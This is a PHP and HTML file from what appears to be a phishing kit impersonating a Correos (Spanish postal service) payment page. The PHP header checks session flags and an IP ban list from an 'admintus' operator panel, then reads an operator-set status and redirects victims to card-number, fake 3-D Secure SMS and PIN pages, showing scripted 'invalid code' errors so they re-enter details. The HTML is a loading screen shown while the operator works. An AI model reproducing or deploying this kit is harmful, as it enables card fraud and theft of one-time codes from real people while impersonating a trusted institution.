<?php
session_start();
require_once './config.php';
require_once './helpers/functions.php';
require_once './helpers/class/UserInfo.php';
require_once './admintus/config/User.php';
require_once './admintus/config/config.php';
require_once './admintus/config/db.class.php';
require_once './helpers/class/StepRedirect.php';

if (!isset($_SESSION['page'])) header("location: ./");
if (!isset($_SESSION['allowed'])) header("location: ./");
if (file_exists("./admintus/IPBam.txt")) comprobateIP("./admintus/IPBam.txt", UserInfo::getIP(), $out_url);

$userclass = new User();
$db  = new db(DB_HOST, DB_USER, DB_PASS, DB_NAME);
$info = $db->fetch($userclass->getStatus($_SESSION['time']));
@$status =  $info['status'];

$wait = new StepRedirect();
$wait->setStatus($status);
$wait->setStep('2',  './redsys', 'update', ['card' => 'El numero de tarjeta es invalido']);
$wait->setStep('3',  './redsys3d');
$wait->setStep('4',  './redsys3d', 'error', ['sms' => 'El codigo SMS ingresado es invalido']);
$wait->setStep('5',  './redsys3d', 'error', ['exp_sms' => 'El codigo SMS ingesado a expirado']);
$wait->setStep('6',  './pin');
$wait->setStep('7',  './pin', 'error', ['pin' => 'El PIN ingresado es invalido']);
$wait->setTimeToRedirect(5);
$wait->start();
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" class="wf-inactive gr__sc-icpdz_correos_es">

<head id="Head1">
    <style>
        .hidden {
            display: none;
        }
    </style>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <script language="javascript" type="text/javascript" src="Seleccione%20medio%20de%20pago_fichiers/typeKit.js"></script>

    <style type="text/css">
        .tk-pt-sans {
            font-family: "pt-sans", sans-serif;
        }
    </style>
    <style type="text/css">
        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/802da8/0000000000000000000124f9/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 400;
            font-style: normal;
        }

        @font-face {
            font-family: pt-sans;
            src: url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff2"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("woff"), url(https://use.typekit.net/af/7505b0/0000000000000000000124fa/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n7&token=yjzt92fIDu%2Bi2yE%2FC%2FROvpoHRueJpI3lKQz6Qi7aWTw%3D) format("opentype");
            font-weight: 700;
            font-style: normal;
        }
    </style>
    <link rel="stylesheet" type="text/css" href="Seleccione%20medio%20de%20pago_fichiers/bootstrap.css" media="screen">
    <link rel="stylesheet" type="text/css" href="Seleccione%20medio%20de%20pago_fichiers/main.css">
    <title>
        Seleccione medio de pago
    </title>
    <link id="Link1" rel="shortcut icon" href="https://sc-icpdz.correos.es/ilionx45Front/lib/estilos/ilion/images/correos.ico">
    <link id="Link2" rel="icon" href="https://sc-icpdz.correos.es/ilionx45Front/lib/estilos/ilion/images/correos.ico" type="image/ico">
</head>

<body onload="hideLoading();" class="ogilvy-body" data-gr-c-s-loaded="true" cz-shortcut-listen="true">
    <form name="formInterfaz" method="post" action="" id="formInterfaz">
        <div>
        </div>
        <!-- Load -->
        <div id="showLoading" style="display: none;">
            <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                <div class="load-container load">
                    <div class="loader">
                        <span id="cargar">CARGANDO..</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="wrapper">
            <section>
                <div id="cabecera" class="container ogilvy-bg-amarillo">
                    <div class="row">
                        <div class="col-xs-12 text-center ogilvy-header">
                            <img src="Seleccione%20medio%20de%20pago_fichiers/ogilvy-logos.png" id="logoCorreos" class="ogilvy-logosuperior" alt="Correos">
                        </div>
                    </div>
                </div>
            </section>
            <div id="panelContent">
                <div class="contenido" id="contenido">
                    <!--ERROR-->
                    <!--TITLES-->
                    <section>
                        <div class="container">
                            <div class="row">
                                <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                    <div id="DatosExtra" class="ogilvy-subtitular">
                                        <span id="Importe" class="subtitulo" style="font-weight:bold;"></span>
                                        <span id="Importevalor" class="subtitulo"></span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </section>
                    <div id="updPanel">
                        <!--Loading-->
                        <div id="updateProgress" style="display:block;" role="status" aria-hidden="true">
                            <div style="position: fixed; text-align: center; height: 100%; width: 100%; top: 0; right: 0; left: 0; z-index: 9999999; background-color: #EAEAEA; opacity: 0.7;">
                                <div class="load-container load">
                                    <div class="loader"><br><br><br><br>
                                        <span id="loading">CARGANDO..</span>
                                    </div>
                                    <img width="108" height="108" src="./assets/img/loading-1.gif">
                                </div>
                            </div>
                        </div>
                        <!--Payments-->
                    </div>
                    <!--Buttons -->
                </div>
            </div>
        </div>
        <!--Hidden values-->
    </form>
</body>
<span class="gr__tooltip"><span class="gr__tooltip-content"></span><i class="gr__tooltip-logo"></i><span class="gr__triangle"></span></span>
</html>